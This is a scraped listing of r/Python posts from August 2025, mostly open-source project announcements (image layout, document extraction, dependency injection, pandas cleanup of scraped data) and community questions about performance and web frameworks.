1mhwp50,Would anyone be interested in a standalone auto-subtitle overlay tool for TikToks/Shorts?,Experimnet,0,3,2025-08-05 02:01:58,https://www.reddit.com/r/Python/comments/1mhwp50/would_anyone_be_interested_in_a_standalone/,"Hey everyone, I'm currently building my own script to automate TikTok content creation, and one of the biggest headaches I ran into was getting styled subtitles rendered properly on vertical videos.

I couldn‚Äôt find anything that already did exactly what I needed, something that could:

parse .srt files,  
render outlined, centered, high-contrast subtitles,  
scale well for 1080x1920 (TikTok/Shorts format),  
and export the final video with subtitles baked in using MoviePy.

So I ended up building my own custom solution from scratch using Pygame and MoviePy. It works pretty well now, and honestly, I wish something like this existed when I started.

If anyone else is looking for something similar, I‚Äôm thinking of open-sourcing it as a separate standalone repo. Let me know if you'd be interested in using or contributing to it. I can ship it if there's any interest."
1mhu1bt,Tuesday Daily Thread: Advanced questions,AutoModerator,3,3,2025-08-05 00:00:31,https://www.reddit.com/r/Python/comments/1mhu1bt/tuesday_daily_thread_advanced_questions/,"# Weekly Wednesday Thread: Advanced Questions üêç

Dive deep into Python with our Advanced Questions thread! This space is reserved for questions about more advanced Python topics, frameworks, and best practices.

## How it Works:

1. **Ask Away**: Post your advanced Python questions here.
2. **Expert Insights**: Get answers from experienced developers.
3. **Resource Pool**: Share or discover tutorials, articles, and tips.

## Guidelines:

* This thread is for **advanced questions only**. Beginner questions are welcome in our [Daily Beginner Thread](#daily-beginner-thread-link) every Thursday.
* Questions that are not advanced may be removed and redirected to the appropriate thread.

## Recommended Resources:

* If you don't receive a response, consider exploring r/LearnPython or join the [Python Discord Server](https://discord.gg/python) for quicker assistance.

## Example Questions:

1. **How can you implement a custom memory allocator in Python?**
2. **What are the best practices for optimizing Cython code for heavy numerical computations?**
3. **How do you set up a multi-threaded architecture using Python's Global Interpreter Lock (GIL)?**
4. **Can you explain the intricacies of metaclasses and how they influence object-oriented design in Python?**
5. **How would you go about implementing a distributed task queue using Celery and RabbitMQ?**
6. **What are some advanced use-cases for Python's decorators?**
7. **How can you achieve real-time data streaming in Python with WebSockets?**
8. **What are the performance implications of using native Python data structures vs NumPy arrays for large-scale data?**
9. **Best practices for securing a Flask (or similar) REST API with OAuth 2.0?**
10. **What are the best practices for using Python in a microservices architecture? (..and more generally, should I even use microservices?)**

Let's deepen our Python knowledge together. Happy coding! üåü"
1mhgs5b,"A free goldmine of tutorials for the components you need to create production-level agents
Extensive",Nir777,21,13,2025-08-04 15:36:35,https://www.reddit.com/r/Python/comments/1mhgs5b/a_free_goldmine_of_tutorials_for_the_components/,"**I‚Äôve worked really hard and launched a FREE resource with 30+ detailed tutorials for building comprehensive production-level AI agents, as part of my Gen AI educational initiative.**

The tutorials cover all the key components you need to create agents that are ready for real-world deployment. I plan to keep adding more tutorials over time and will make sure the content stays up to date.

The response so far has been incredible! (the repo got nearly 10,000 stars in one month from launch - all organic) This is part of my broader effort to create high-quality open source educational material. I already have over 130 code tutorials on GitHub with over 50,000 stars.

I hope you find it useful. The tutorials are available here: [https://github.com/NirDiamant/agents-towards-production](https://github.com/NirDiamant/agents-towards-production)

The content is organized into these categories:

1. Orchestration
2. Tool integration
3. Observability
4. Deployment
5. Memory
6. UI & Frontend
7. Agent Frameworks
8. Model Customization
9. Multi-agent Coordination
10. Security
11. Evaluation
12. Tracing & Debugging
13. Web Scraping"
1mhdbcf,PicTex v1.0 is here: a declarative layout engine for creating images in Python,_unknownProtocol,40,12,2025-08-04 13:22:53,https://www.reddit.com/r/Python/comments/1mhdbcf/pictex_v10_is_here_a_declarative_layout_engine/,"Hey r/Python,

A few weeks ago, I [posted](https://www.reddit.com/r/Python/comments/1lwjsar/pictex_a_python_library_to_easily_create_stylized/) about my personal project, `PicTex`, a library for making stylized text images. I'm really happy for all the feedback and suggestions I received.

It was a huge motivator and inspired me to take the project to the next level. I realized the core idea of a simple, declarative API could be applied to more than just a single block of text. So, `PicTex` has evolved. It's no longer just a ""text-styler""; it's now a declarative UI-to-image layout engine.

You can still do simple, beautiful text banners easily:

```python
from pictex import Canvas, Shadow, LinearGradient

# 1. Create a style template using the fluent API
canvas = (
    Canvas()
    .font_family(""Poppins-Bold.ttf"")
    .font_size(60)
    .color(""white"")
    .padding(20)
    .background_color(LinearGradient([""#2C3E50"", ""#FD746C""]))
    .border_radius(10)
    .text_shadows(Shadow(offset=(2, 2), blur_radius=3, color=""black""))
)

# 2. Render some text using the template
image = canvas.render(""Hello, World! üé®‚ú®"")

# 3. Save or show the result
image.save(""hello.png"")
```
Result: [https://imgur.com/a/Wp5TgGt](https://imgur.com/a/Wp5TgGt)

But now you can compose different components together. Instead of just rendering text, you can now build a whole tree of `Row`, `Column`, `Text`, and `Image` nodes.

Here's a card example:

```python
from pictex import *

# 1. Create the individual content builders
avatar = (
    Image(""avatar.jpg"")
    .size(60, 60)
    .border_radius('50%')
)

user_info = Column(
    Text(""Alex Doe"").font_size(20).font_weight(700),
    Text(""@alexdoe"").color(""#657786"")
).gap(4)

# 2. Compose the builders in a layout container
user_banner = Row(
    avatar,
    user_info
).gap(15).vertical_align('center')

# 3. Create a Canvas and render the final composition
canvas = Canvas().padding(20).background_color(""#F5F8FA"")
image = canvas.render(user_banner)

# 4. Save the result
image.save(""user_banner.png"")
```
Result: [https://imgur.com/a/RcEc12W](https://imgur.com/a/RcEc12W)

The library automatically handles all the layout, sizing, and positioning based on the `Row`/`Column` structure.

---

### What My Project Does

`PicTex` is now a declarative framework for generating static images from a component tree. It allows you to:

*   **Compose Complex Layouts:** Build UIs by nesting `Row`, `Column`, `Text`, and `Image` nodes.
*   **Automatic Layout:** It uses a Flexbox-like model to automatically handle positioning and sizing. Set `gap`, `distribution`, and `alignment`.
*   **Universal Styling:** Apply backgrounds, padding, borders, shadows, and border-radius to *any* component, not just the text.
*   **Advanced Typography:** All the original features are still there: custom fonts, font fallbacks for emojis, gradients, outlines, etc.
*   ~~**Native Python:** It's all done within Python using Skia, with no need for external dependencies like a web browser or HTML renderer~~. **Edit**: It's not truly ""native Python"". It uses a Skia to handle rendering.

---

### Target Audience

The target audience has grown quite a bit! It's for anyone who needs to generate structured, data-driven images in Python.

*   Generating **social media profile cards**, quote images, or event banners.
*   Creating dynamic **Open Graph images** for websites.
*   Building custom **info-graphics** or report components.
*   **Developers familiar with declarative UI frameworks**  who want a similar experience for generating static images in Python.

It's still a personal project at heart, but it's becoming a much more capable and general-purpose tool.

---

### Comparison

The evolution of the library introduces a new set of comparisons:

*   **vs. Pillow/OpenCV:** Pillow is a drawing canvas; `PicTex` is a layout engine. With `PicTex`, you describe the *structure* of your UI and let the library figure out the coordinates. Doing the profile card example in Pillow would require dozens of manual calculations for every single element's position and size.

*   **vs. HTML/CSS-to-Image libraries:** These are powerful but come with a major dependency: a full web browser engine (like WebKit or Chrome). This can be heavy, slow, and a pain to set up in production environments. `PicTex` is a **native Python solution**. It's a single, self-contained `pip install` with no external binaries to manage. This makes it much lighter and easier to deploy.

---

I'm so grateful for the initial encouragement. It genuinely inspired me to push this project further. I'd love to hear what you think of the new direction!

There are probably still some rough edges, so all feedback is welcome.

*   **GitHub Repo:** [https://github.com/francozanardi/pictex](https://github.com/francozanardi/pictex)
*   **PyPI Page:** [https://pypi.org/project/pictex/](https://pypi.org/project/pictex/) (The new version is up!)"
1mhaury,Most performant tabular data-storage system that allows retrieval from the disk using random access,kris_2111,32,136,2025-08-04 11:28:42,https://www.reddit.com/r/Python/comments/1mhaury/most_performant_tabular_datastorage_system_that/,"So far, in most of my projects, I have been saving tabular data in CSV files as the performance of retrieving data from the disk hasn't been a concern. I'm currently working on a project which involves thousands of tables, and each table contains around a million rows. The application requires frequently accessing specific rows from specific tables. Often times, there may only be a need to access not more than ten rows from a specific table, but given that I have my tables saved as CSV files, I have to read an entire table just to read a handful of rows from it. This is very inefficient. 

When starting out, I would use the most popular Python library to work with CSV files: Pandas. Upon learning about Polars, I have switched to it, and haven't had to use Pandas ever since. Polars enables around ten-times faster data retrieval from the disk to a DataFrame than Pandas. This is great, but still inefficient, because it still needs to read the entire file. Parquet enables even faster data retrieval, but is still inefficient, because it still requires reading the entire file to retrieve a specific set of rows. SQLite provides the ability to read only specific rows, but reading an entire table from the disk is twice as slow as reading the same table from a CSV file using Pandas, so that isn't a viable option.

I'm looking for a data-storage format with the following features:
1. Reading an entire table is at least as fast as it is with Parquet using Polars.
2. Enables reading only specific rows from the disk using SQL-like queries ‚Äî it should not read the entire table.

My tabular data is numerical, contains not more than ten columns, and the first column serves as the primary-key column. Storage space isn't a concern here. I may be a bit finicky here, but it'd great if it's something that provides the same kind of convenient API that Pandas and Polars provide ‚Äî transitioning from Pandas to Polars was a breeze, so I'm kind of looking for something similar here, but I understand that it may not be possible given my requirements. However, since performance is my top priority here, I wouldn't mind having added a bit more complexity to my project at the benefit of the aforementioned features that I get."
1mh914m,Open source tool for structured data extraction for any document formats. With free cloud processing,LostAmbassador6872,24,4,2025-08-04 09:43:09,https://www.reddit.com/r/Python/comments/1mh914m/open_source_tool_for_structured_data_extraction/,"Hi everyone,

I've built **DocStrange**, an open‚Äësource Python library that intelligently extracts data from any document type (PDFs, Word, Excel, PowerPoints, images, or even URLs). You can convert them into JSON, CSV, HTML‚Äîor clean, structured Markdown, optimized for LLMs.

* **Local Mode** ‚Äî CPU/GPU options available for full privacy and no dependence on external services.
* **Cloud Mode**  ‚Äî free processing up to **10k docs/month**

It‚Äôs ideal for document automation, archiving pipelines, or prepping data for AI workflows. Would love feedback on edge‚Äëcases or specific data types (e.g. invoices, research papers, forms) that you'd like supported!

GitHub: [https://github.com/NanoNets/docstrange](https://github.com/NanoNets/docstrange)  
PyPI: [https://pypi.org/project/docstrange/](https://pypi.org/project/docstrange/)

  
**Edit**: Have deployed it here for quick testing - [https://docstrange.nanonets.com/](https://docstrange.nanonets.com/) "
1mh7puf,"We‚Äôre building a ‚Äúwrite once, run everywhere‚Äù bridge between Python and other languages.",javonet1,0,8,2025-08-04 08:17:03,https://www.reddit.com/r/Python/comments/1mh7puf/were_building_a_write_once_run_everywhere_bridge/,"Hey everyone üëã

We‚Äôre a small group of systems-level devs who‚Äôve been exploring a cross-language interoperability layer for Python. The idea is to make it possible to reuse Python libraries directly from other runtimes like JavaScript, Java, .NET, Ruby, and Perl - *in-process*, without microservices, wrappers, or RPC overhead.

The goal is to allow shared business logic across heterogeneous stacks by calling Python classes and functions natively from other environments.

We‚Äôve published a short article outlining how the approach works:  
üîó [Cross-language Python integration without microservices](https://www.javonet.com/wrap-once-run-everywhere_-integrating-python-with-net-java-and-node-js-using-javonet/?utm_source=reddit&utm_medium=social&utm_campaign=internal_educational_content&utm_content=wrap_once_python_rpython)

So far:

* The SDK is live, with a free tier for personal/non-commercial use. For a commercial project, we ask to purchase a license.
* Some commercial early adopters are using it in production.
* A new version is in development with support for strong typing and better interface bindings (moving away from string-based APIs). Should be released in November 2025.

# How it compares:

Most existing cross-language tools (like gRPC, Thrift, or FFI-based bridges) require:

* One-off adapters per language pair (e.g. JS‚ÜíPython, Java‚ÜíPython, etc.)
* Complex glue code, IDLs, or wrappers
* Separate processes and IPC overhead

In contrast, our project can connect *any* pair of supported languages, without writing per-language bridges. It‚Äôs fully in-process, with very low overhead - designed for scenarios where performance matters.

We‚Äôre also publishing a biweekly series showing real-world cross-language integrations - Python talking to JavaScript, .NET, and others - mostly focused on pain points around interop and reducing reimplementation.

Would be curious if others have experimented with this space or have seen similar tooling in the wild. Happy to chat in the comments if there‚Äôs interest."
1mh316u,Good books/resources related to Python debugging.,mjpcoder_type,12,8,2025-08-04 03:37:04,https://www.reddit.com/r/Python/comments/1mh316u/good_booksresources_related_to_python_debugging/,Are there any (recommended) books or online resources that focus primarily on debugging or is it always concentrated within tutorials?  What tools in particular should I look into?
1mh0jy1,I built an AI that writes Python tests by analyzing your code's structure (AST),Serious-Aardvark9850,0,10,2025-08-04 01:34:40,https://www.reddit.com/r/Python/comments/1mh0jy1/i_built_an_ai_that_writes_python_tests_by/,"I've been working on an open-source project that I'm excited to share with you all. It's an AI-powered tool that helps automate the often tedious process of writing comprehensive tests for Python code.

You can find the project on GitHub here: [https://github.com/jazzberry-ai/python-testing-mcp](https://github.com/jazzberry-ai/python-testing-mcp)

\---

### What My Project Does

My project is a local server that provides AI-powered tools to test your Python code. It has three main capabilities:

1. Automated Unit Tests: You can point it at a Python file, and it will generate a full unittest test suite, complete with edge cases and error handling.
2. Intelligent Fuzz Testing: You can target a specific function, and the AI will generate a diverse list of 20+ challenging inputs (e.g., boundary values, malformed data, large inputs) to try and find hidden bugs or crashes.
3. Coverage-Driven Testing: This is the core feature. The tool first parses your code into an Abstract Syntax Tree (AST) to identify every single branch, loop, and exception path. It then uses this analysis to guide an AI (Google's Gemini) to write a specific test for each path. It then runs the generated tests and uses [coverage.py](http://coverage.py) to give you a report on the exact line and branch coverage achieved.The whole thing is built as a Model Context Protocol (MCP) server, so it runs locally and you can interact with it from your terminal or editor.

### Target Audience

This tool is for any Python developer who wants to improve their test coverage without spending hours writing boilerplate test code.

\* For Hobbyists & Solo Devs: It's a great way to quickly add a robust test suite to your personal projects.

\* For Professional Devs & Teams: It can significantly speed up the development cycle by automating test generation, freeing you up to focus on feature development. It's great for getting baseline coverage on new code or improving coverage on legacy modules.

\* Is it a toy project? It's more than a toy, but not a commercial product. I'd classify it as a powerful developer utility designed to be run locally to augment your workflow.

### Comparison

How does this differ from what's already out there?

\* vs. Manual Testing: The most obvious comparison. This tool is significantly faster and can often be more systematic, ensuring that no branch or condition is forgotten.

\* vs. Other AI Tools (like GitHub Copilot): While tools like Copilot can generate test snippets, they are generally stateless and don't have a deep, structural understanding of your entire file. My tool is different because it uses deterministic AST analysis to guide the AI. It doesn't just guess what a good test might be; it systematically instructs the AI to ""write a test that makes this if statement true"" or ""write a test that causes this try...except block to trigger."" This leads to much more comprehensive and reliable test suites.

\* vs. Property-Based Testers (like Hypothesis): Hypothesis is an amazing library, but it works differently. Hypothesis requires you to define properties and data generation strategies. My tool generates concrete, explicit unittest cases that are easy to read and check into your repository. The fuzz testing feature is spiritually similar to property-based testing, but instead of using strategies, it uses AI to brainstorm a diverse set of potentially problematic inputs.

In short, the key differentiator is the hybrid approach: combining rigid, deterministic code analysis with the flexible, creative power of an LLM.

I'd love for you to try it out and let me know what you think. All feedback is welcome"
1mgzwnn,sp2mp - convert local co-op gaming to online (LAN) co-op,SamG101_,13,0,2025-08-04 01:03:10,https://www.reddit.com/r/Python/comments/1mgzwnn/sp2mp_convert_local_coop_gaming_to_online_lan_coop/,"github: [SamG101-Developer/sp2pm](https://github.com/SamG101-Developer/sp2pm)

# what my project does

this project allows for local co-op games to be played across multiple devices on the same network.

for example, the superfighters platform game has a 2-player mode, using WASD and the arrow keys, on the same device. `sp2mp` allows one device to act as a server, selecting clients to broadcast to, and other devices can act as clients (binding to a port), so the server device could use arrow keys, and the client uses WASD.

the server sends a stream of the game to the clients, the clients receive the stream in real-time (tested 60fps), and can use key presses to send the key events back (key-press & key-release). the server collates all received events and applies them to the system.

the app that the server chooses to stream is selected by title (with pid scanning then process name), and has a preview before streaming starts.

# target audience

anyone into older local co-op web-games or flash-games (.swf on flashplayer-debug), that would rather play on two devices over a LAN.

# comparison

a piece of software called [parsec](https://en.wikipedia.org/wiki/Parsec_(software)) seems to be very similar to what my software does, and has a lot more features. my software is more of a toy project because i wanted to play some local co-op games online w family/friends and thought why not try coding it myself.

# notes

* its called `sp2mp` because originally i called it ""single-player to multi-player"", then way too late realised that made no sense, as i meant ""single-device to multi-device"" but oh well.
* only works on windows (key event handling).
* the key-mapper hasn't fully been added (ie allowing both devices to use the arrow keys, but the client auto-maps theirs to WASD)"
1mgylil,Monday Daily Thread: Project ideas!,AutoModerator,1,0,2025-08-04 00:00:31,https://www.reddit.com/r/Python/comments/1mgylil/monday_daily_thread_project_ideas/,"# Weekly Thread: Project Ideas üí°

Welcome to our weekly Project Ideas thread! Whether you're a newbie looking for a first project or an expert seeking a new challenge, this is the place for you.

## How it Works:

1. **Suggest a Project**: Comment your project idea‚Äîbe it beginner-friendly or advanced.
2. **Build & Share**: If you complete a project, reply to the original comment, share your experience, and attach your source code.
3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1mgw5uf,receipt-statement-linker - extract and link data from receipts and bank statements into a json file,BigThiccBoi27,0,0,2025-08-03 22:11:21,https://www.reddit.com/r/Python/comments/1mgw5uf/receiptstatementlinker_extract_and_link_data_from/,"# What My Project Does

`receipt-statement-linker` is a program that uses LLMs to extract data from bank statements and receipts, and matches the receipt to the bank statement transaction. The output is one single json file.

I began budgeting and could not find any tool like this, making spending tough to categorize. If you only consider bank statements, many transactions are quite opaque (e.g. I can go to Walmart and buy an iPhone, a plunger, and some groceries all in one transaction. What do I categorize that transaction as?). If you only look at receipts, it is possible you miss transactions (e.g. I pay student loans every month, but I get no receipt). Considering both receipts and bank statements ensures everything is accounted for, while also getting item level insights through the receipt.

# Target Audience

The target audience is people who need a tool that captures financial transaction data in a holistic manner to enable better budgeting

# Comparison

I personally could not find another project that takes both bank statements and receipts and combines them.

Try it out, and let me know what you guys think!

[https://github.com/rehanzo/receipt-statement-linker](https://github.com/rehanzo/receipt-statement-linker)"
1mgsnxn,"Bash user here, am I missing something with not using python?",Mashic,142,113,2025-08-03 19:51:02,https://www.reddit.com/r/Python/comments/1mgsnxn/bash_user_here_am_i_missing_something_with_not/,"Hello, I'm managing a couple of headless servers, and I use bash scripts heavily to manage them. I manage mostly media files with ffmpeg, other apps, copying and renaming... and other apps.

However, whenever I see someone else creating scripts, most of them are in python using api instead of direct command lines. Is python really that better for these kind of tasks compared to bash?"
1mgrhg8,A lightweight and framework-agnostic Python library to handle social login with OAuth2,Remarkable-Bag4365,11,2,2025-08-03 19:03:42,https://www.reddit.com/r/Python/comments/1mgrhg8/a_lightweight_and_frameworkagnostic_python/,"Hey everyone! üëã

I just open-sourced a Python package I had been using internally in multiple projects, and I thought it could be useful for others too.

**[SimpleSocialAuthLib](https://github.com/Macktireh/SimpleSocialAuthLib)** is a small, framework-agnostic library designed to simplify social authentication in Python. It helps you handle the OAuth2 flow and retrieve user data from popular social platforms, without being tied to any specific web framework.

### Why use it?

* **Framework-Agnostic**: Works with any Python web stack ‚Äî FastAPI, Django, Flask, etc.
* **Simplicity**: Clean and intuitive API to deal with social login flows.
* **Flexibility**: Consistent interface across all providers.
* **Type Safety**: Uses Python type hints for better dev experience.
* **Extensibility**: Easily add custom providers by subclassing the base.
* **Security**: Includes CSRF protection with state parameter verification.

### Supported providers:

* ‚úÖ Google
* ‚úÖ GitHub
* ‚è≥ Twitter/X (coming soon)
* ‚è≥ LinkedIn (coming soon)

It‚Äôs still evolving, but stable enough to use.
I‚Äôd love to hear your feedback, ideas, or PRs! üôå

Repo: [https://github.com/Macktireh/SimpleSocialAuthLib](https://github.com/Macktireh/SimpleSocialAuthLib)
"
1mgpdzi,Schemix ‚Äî A PyQt6 Desktop App for Engineering Students,Specialist-Arachnid6,31,2,2025-08-03 17:41:40,https://www.reddit.com/r/Python/comments/1mgpdzi/schemix_a_pyqt6_desktop_app_for_engineering/,"Hey r/Python,

I've been working on a desktop app called **Schemix,** an all-in-one study companion tailored for engineering students. It brings together smart note-taking, circuit analysis, scientific tools, and educational utilities into a modular and distraction-free interface.

# What My Project Does

Schemix provides a unified platform where students can:

* Take subject/chapter-wise notes using Markdown + LaTeX (Rich Text incl images)
* Analyse electrical circuits visually
* SPC Analysis for Industrial/Production Engineering
* Access a dockable periodic table with full filtering, completely offline
* Solve equations, convert units, and plot math functions (Graphs can be attached to note too)
* Instantly fetch Wikipedia summaries for concept brushing

It‚Äôs built using **PyQt6** and is designed to be extendable, clean, and usable offline.

# Target Audience

* Engineering undergrads (especially 1st and 2nd years)
* JEE/KEAM/BITSAT aspirants (India-based technical entrance students)
* Students or self-learners juggling notes, calculators, and references
* Students who loves to visualise math and engineering concepts
* Anyone who likes markdown-driven study apps or PyQt-based tools

# Comparison

Compared to Notion or Obsidian, Schemix is purpose-built for engineering study, with support for LaTeX-heavy notes, a built-in circuit analyser, calculators, and a periodic table, all accessible offline.

Online circuit simulators offer more advanced physics, but require internet and don't integrate with your notes or workflow. Schemix trades web-dependence for modular flexibility and Python-based extensibility.

If you're tired of switching between 5 different tools just to prep for one exam,  Schemix tries to bundle that chaos into one app.

# GitHub

[GitHub Link](http://github.com/rohankishore/Schemix/)"
1mgp8h6,What are common pitfalls and misconceptions about python performance?,MilanTheNoob,70,111,2025-08-03 17:35:43,https://www.reddit.com/r/Python/comments/1mgp8h6/what_are_common_pitfalls_and_misconceptions_about/,"There are a lot of criticisms about python and its poor performance. Why is that the case, is it avoidable and what misconceptions exist surrounding it?"
1mgoi0f,Built an Agent Protocol server with FastAPI - open-source LangGraph Platform alternative,Lost-Trust7654,0,6,2025-08-03 17:06:24,https://www.reddit.com/r/Python/comments/1mgoi0f/built_an_agent_protocol_server_with_fastapi/,"Hey Python community!

I've been building an Agent Protocol server using FastAPI and PostgreSQL as an open-source alternative to LangGraph Platform.

**What My Project Does:**

* Serves LangGraph agents via HTTP APIs following the Agent Protocol specification
* Provides persistent storage for agent conversations and state
* Handles authentication, streaming responses, and background task processing
* Offers a self-hosted deployment solution for AI agents

**Target Audience:**

* Production-ready for teams deploying AI agents at scale
* Developers who want control over their agent infrastructure
* Teams looking to avoid vendor lock-in and expensive SaaS pricing
* LangGraph users who need custom authentication and database control

**Comparison with Existing Alternatives:**

* **LangGraph Platform (SaaS)**: Expensive pricing ($500+/month), vendor lock-in, no custom auth, forced tracing
* **LangGraph Platform (Self-hosted Lite)**: No custom authentication, limited features
* **LangServe**: Being deprecated, no longer recommended for new projects
* **My Solution**: Open-source, self-hosted, custom auth support, PostgreSQL persistence, zero vendor lock-in

**Agent Protocol Server**: [https://github.com/ibbybuilds/agent-protocol-server](https://github.com/ibbybuilds/agent-protocol-server)

**Tech stack:**

* FastAPI for the HTTP layer
* PostgreSQL for persistence
* LangGraph for agent execution
* Agent Protocol compliance

**Status:** MVP ready, working on production hardening. Looking for contributors and early adopters.

Would love to hear from anyone working with LangGraph or agent deployment!"
1mgld00,How I Spent Hours Cleaning Scraped Data With Pandas (And What I‚Äôd Do Differently Next Time),PINKINKPEN100,28,5,2025-08-03 14:58:30,https://www.reddit.com/r/Python/comments/1mgld00/how_i_spent_hours_cleaning_scraped_data_with/,"Last weekend, I pulled together some data for a side project and honestly thought the hard part would be the scraping itself. Turns out, getting the data was easy‚Ä¶ making it usable was the real challenge.

The dataset I scraped was a mess:

* Missing values in random places
* Duplicate entries from multiple runs
* Dates in all kinds of formats
* Prices stored as strings, sometimes even spelled out in words (‚Äútwenty‚Äù)

After a few hours of trial, error, and too much coffee, I leaned on Pandas to fix things up. Here‚Äôs what helped me:

1. Handling Missing Values

I didn‚Äôt want to drop everything blindly, so I selectively removed or filled gaps.

    import pandas as pd
    
    df = pd.read_csv(""scraped_data.csv"")
    
    # Drop rows where all values are missing
    df_clean = df.dropna(how='all')
    
    # Fill known gaps with a placeholder
    df_filled = df.fillna(""N/A"")

2. Removing Duplicates

Running the scraper multiple times gave me repeated rows. Pandas made this part painless:

    df_unique = df.drop_duplicates()

3. Standardizing Formats

This step saved me from endless downstream errors:

    # Normalize text
    df['product_name'] = df['product_name'].str.lower()
    
    # Convert dates safely
    df['date'] = pd.to_datetime(df['date'], errors='coerce')
    
    # Convert price to numeric
    df['price'] = pd.to_numeric(df['price'], errors='coerce')

4. Filtering the Noise

I removed data that didn‚Äôt matter for my analysis:

    # Drop columns if they exist
    df = df.drop(columns=['unnecessary_column'], errors='ignore')
    
    # Keep only items above a certain price
    df_filtered = df[df['price'] > 10]
    

5. Quick Insights

Once the data was clean, I could finally do something useful:

    avg_price = df_filtered.groupby('category')['price'].mean()
    print(avg_price)
    
    import matplotlib.pyplot as plt
    
    df_filtered['price'].plot(kind='hist', bins=20, title='Price Distribution')
    plt.xlabel(""Price"")
    plt.show()

  
What I Learned:

* Scraping is the ‚Äúeasy‚Äù part; cleaning takes way longer than expected.
* Pandas can solve 80% of the mess with just a few well-chosen functions.
* Adding `errors='coerce'` prevents a lot of headaches when parsing inconsistent data.
* If you‚Äôre just starting, I recommend reading a tutorial on cleaning scraped data with Pandas (the one I followed is [here](https://crawlbase.com/blog/how-to-use-python-pandas-to-analyze-data/) ‚Äì super beginner-friendly).

I‚Äôd love to hear how other Python devs handle chaotic scraped data. Any neat tricks for weird price strings or mixed date formats? I‚Äôm still learning and could use better strategies for my next project."
1mgkwmn,Would you recommend Litestar or FastAPI for building large scale api in 2025,NoTangelo5541,91,54,2025-08-03 14:39:31,https://www.reddit.com/r/Python/comments/1mgkwmn/would_you_recommend_litestar_or_fastapi_for/,"In 2025, how do Litestar and FastAPI compare for large-scale APIs?

* **Performance:** Which offers better speed and efficiency under heavy load?
* **Ecosystem & Maturity:** Which has a more robust community, a wider range of plugins, and more established documentation?
* **Developer Experience:** Which provides a more intuitive and productive development process, especially for complex, long-term projects?"
1mgiq4w,Introduce DateTime Wrapper to streamline some DateTime features.,twh970723,0,2,2025-08-03 13:03:25,https://www.reddit.com/r/Python/comments/1mgiq4w/introduce_datetime_wrapper_to_streamline_some/,"I have recently created a python package, basically a wrapper on top of DateTime Library.  
And decided to share it to community, as I found it useful to streamline some hustles when building/ calling some DateTime functions.

Feel free to have a look.  
Repo: [https://github.com/twh970723/DateTimeEnhanced](https://github.com/twh970723/DateTimeEnhanced)

Open for inputs (If Any) if you have any thoughts or feature you would like to have in this packages. I will maintain this package from time to time.

**What It Does**  
[DateTimeEnhanced](https://github.com/twh970723/DateTimeEnhanced)¬†is a small Python package that wraps the built-in¬†`datetime`¬†module to make common tasks like formatting, weekday indexing, and getting structured output easier.

**Target Audience**  
Great for developers or data analysts who want quick, readable access to date/time info without dealing with verbose¬†`datetime`¬†code.

**Comparison**  
Unlike¬†`arrow`¬†or¬†`pendulum`, this doesn‚Äôt replace¬†`datetime`‚Äîjust makes it more convenient for everyday use, with no extra dependencies."
1mgi3nx,Injectipy: Python DI with explicit scopes instead of global state,Wimpienator,27,9,2025-08-03 12:32:25,https://www.reddit.com/r/Python/comments/1mgi3nx/injectipy_python_di_with_explicit_scopes_instead/,"**What My Project Does:**
Injectipy is a dependency injection library that uses explicit scopes with context
managers instead of global containers. You register dependencies in a scope, then use
`with scope:` to activate injection. It supports both string keys and type-based keys
(`Inject[DatabaseService]`) with full mypy support.

```python
scope = DependencyScope()
scope.register_value(DatabaseService, PostgreSQLDatabase())

@inject
def get_users(db: DatabaseService = Inject[DatabaseService]):
    return db.query(""SELECT * FROM users"")

with scope:
    users = get_users()  # db injected automatically
```

**Target Audience:**
Production-ready for applications that need clean dependency management. Perfect for
teams who want thread-safe DI without global state pollution. Great for testing since
each test gets its own isolated scope.

**Comparison:**
vs FastAPI's Depends:
FastAPI's DI is tied to HTTP request lifecycle and relies on global state -
dependencies must be declared at module level when Python does semantic analysis. This
creates hidden global coupling. Injectipy's explicit scopes work anywhere in your code,
not just web endpoints, and each scope is completely isolated. You activate injection
explicitly with with scope: rather than having it tied to framework lifecycle.

vs python-dependency-injector:
dependency-injector uses complex provider patterns (Factory, Singleton, Resource) with
global containers. You configure everything upfront in a container that lives for your
entire application. Their Singleton provider isn't even thread-safe by default. Injectipy eliminates this complexity: register dependencies
in a scope, use them in a context manager. Each scope is naturally thread-isolated, no
complex provider hierarchies needed.

vs injector library:
While injector avoids truly global state (you can create multiple Injector instances),
you still need to pass injector instances around your codebase and explicitly call
injector.get(MyClass). Injectipy's context manager approach means dependencies are
automatically injected within scope blocks.

Let me know what you think or if you have any feedback!

`pip install injectipy`

Repo: https://github.com/Wimonder/injectipy"
1mgg0lc,I used Python for both data generation and UI in a real-time Kafka/Flink analytics project,jaehyeon-kim,6,1,2025-08-03 10:33:05,https://www.reddit.com/r/Python/comments/1mgg0lc/i_used_python_for_both_data_generation_and_ui_in/,"Hey Pythonistas,

I wanted to share a hands-on project that showcases Python's versatility in a modern data engineering pipeline. The project is for real-time mobile game analytics and uses Python at both the beginning and the end of the workflow.

Here's how it works:
*   **Python for Data Generation:** I wrote a script to generate mock mobile game events, which feeds the entire pipeline.
*   **Kafka & Flink for Processing:** The heavy lifting of stream processing is handled by Kafka and Flink.
*   **Python & Streamlit for Visualization:** I used Python again with the awesome Streamlit library to build an interactive web dashboard to visualize the real-time metrics.

It's a practical example of how you can use Python to simulate data and quickly build a user-friendly UI for a complex data pipeline.

The full source code is available on GitHub: https://github.com/factorhouse/examples/tree/main/projects/mobile-game-top-k-analytics

